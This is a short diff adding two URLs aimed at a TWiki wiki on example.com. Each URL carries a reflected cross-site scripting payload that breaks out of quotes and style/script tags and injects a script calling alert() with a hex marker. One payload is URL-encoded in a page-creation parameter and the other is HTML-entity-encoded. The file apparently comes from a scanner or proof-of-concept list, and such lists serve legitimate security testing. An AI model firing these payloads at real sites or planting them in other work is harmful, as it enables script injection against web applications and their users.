@@ -1,0 +1,3 @@
+http://example.com/do/view/Main/Jump?create=on&amp;newtopic=%27%22--%3E%3C/style%3E%3C/script%3E%3Cscript%3Ealert%280x0051D1%29%3C/script%3E&amp;template=WebCreateNewTopic&amp;topicparent=3
+
+http://example.com/do/view/TWiki/ATasteOfTWiki?&#039;&quot;--&gt;&lt;/style&gt;&lt;/script&gt;&lt;script&gt;alert(0x002B48)&lt;/script&gt;
